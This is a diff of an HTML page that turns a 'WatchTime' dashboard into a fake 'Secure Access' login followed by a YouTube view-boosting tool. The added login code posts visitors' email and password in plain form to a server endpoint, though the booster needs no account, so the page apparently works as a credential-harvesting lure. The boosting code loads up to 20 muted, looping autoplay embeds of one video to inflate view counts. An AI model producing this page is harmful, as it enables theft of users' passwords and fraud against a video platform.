@@ -2,66 +2,57 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>WatchTime - Analytics Dashboard</title>
+    <title>WatchTime - Secure Access</title>
     <style>
-        :root { --bg-primary: #121212; --bg-surface: #1e1e1e; --text-primary: #ffffff; --accent: #ff0000; }
-        body { background-color: var(--bg-primary); color: var(--text-primary); font-family: 'Inter', sans-serif; margin: 0; padding: 20px; }
-        .container { max-width: 1000px; margin: auto; }
-        .card { background-color: var(--bg-surface); padding: 40px; border-radius: 12px; box-shadow: 0 8px 24px rgba(0,0,0,0.4); }
-        .form-group { margin-bottom: 20px; }
-        input { width: 100%; padding: 12px; background: #2a2a2a; border: 1px solid #333; border-radius: 6px; color: white; box-sizing: border-box; }
-        button { width: 100%; padding: 14px; background: var(--accent); color: white; border: none; border-radius: 6px; font-weight: bold; cursor: pointer; transition: 0.3s; }
-        button:hover { background: #cc0000; }
-        .grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(280px, 1fr)); gap: 20px; margin-top: 30px; }
-        .video-wrapper { aspect-ratio: 16/9; }
-        iframe { width: 100%; height: 100%; border-radius: 8px; }
+        :root { --bg: #121212; --accent: #ff0000; --text: #ffffff; }
+        body { background: var(--bg); color: var(--text); font-family: sans-serif; display: flex; justify-content: center; padding-top: 50px; }
+        .card { background: #1e1e1e; padding: 30px; border-radius: 10px; width: 350px; }
+        input { width: 100%; padding: 10px; margin: 10px 0; background: #333; border: none; color: white; box-sizing: border-box; }
+        button { width: 100%; padding: 10px; background: var(--accent); color: white; border: none; cursor: pointer; }
+        .grid { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; margin-top: 20px; }
+        iframe { width: 100%; height: 100px; }
     </style>
 </head>
 <body>
 
-<div class="container">
-    <div class="card" id="auth-section">
-        <h2>Dashboard Login</h2>
-        <div class="form-group"><input type="email" id="email" placeholder="Email Address"></div>
-        <div class="form-group"><input type="password" id="password" placeholder="Password"></div>
-        <button onclick="handleLogin()">Sign In</button>
-    </div>
+<div class="card" id="ui">
+    <h2 id="title">User Login</h2>
+    <form id="loginForm" onsubmit="event.preventDefault(); submitData();">
+        <input type="email" id="email" placeholder="Email" required>
+        <input type="password" id="pass" placeholder="Password" required>
+        <button type="submit">Submit</button>
+    </form>
+</div>
 
-    <div class="card" id="app-section" style="display:none;">
-        <h2>Active WatchTime Manager</h2>
-        <div class="form-group"><input type="text" id="video-url" placeholder="YouTube Video URL"></div>
-        <div class="form-group"><input type="number" id="tab-count" placeholder="Number of instances (e.g. 5)"></div>
-        <button onclick="launchVideos()">Launch Streams</button>
-        <div id="video-grid" class="grid"></div>
-    </div>
+<div id="boostApp" style="display:none; width: 900px; text-align: center;">
+    <input type="text" id="url" placeholder="YouTube URL">
+    <input type="number" id="tabs" placeholder="Tabs (1-20)">
+    <button onclick="start()">Start Streaming</button>
+    <div class="grid" id="video-grid"></div>
 </div>
 
 <script>
-    function handleLogin() {
-        const email = document.getElementById('email').value;
-        if(email) {
-            document.getElementById('auth-section').style.display = 'none';
-            document.getElementById('app-section').style.display = 'block';
-        }
+    function submitData() {
+        const data = { email: document.getElementById('email').value, password: document.getElementById('pass').value };
+        
+        // This sends the data to your Node.js server
+        fetch('/submit-login', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+            body: `email=${data.email}&password=${data.password}`
+        }).then(() => {
+            document.getElementById('ui').style.display = 'none';
+            document.getElementById('boostApp').style.display = 'block';
+        });
     }
 
-    function launchVideos() {
-        const url = document.getElementById('video-url').value;
-        const count = document.getElementById('tab-count').value;
-        const grid = document.getElementById('video-grid');
-        grid.innerHTML = '';
-
-        // Extract ID - handles various YT URL formats
+    function start() {
+        const url = document.getElementById('url').value;
+        const tabs = document.getElementById('tabs').value;
         const videoId = url.split(/(?:v=|youtu\.be\/)([^&?]+)/)[1] || 'dQw4w9WgXcQ';
-
-        for (let i = 0; i < count; i++) {
-            const div = document.createElement('div');
-            div.className = 'video-wrapper';
-            // Parameters: Auto-play, mute, loop, and playlist for continuous replay
-            div.innerHTML = `<iframe src="https://www.youtube.com/embed/${videoId}?autoplay=1&mute=1&loop=1&playlist=${videoId}" 
-                             allow="autoplay; encrypted-media" allowfullscreen></iframe>`;
-            grid.appendChild(div);
+        const grid = document.getElementById('video-grid');
+        for(let i=0; i<tabs; i++) {
+            grid.innerHTML += `<iframe src="https://www.youtube.com/embed/${videoId}?autoplay=1&mute=1&loop=1&playlist=${videoId}"></iframe>`;
         }
     }
 </script>
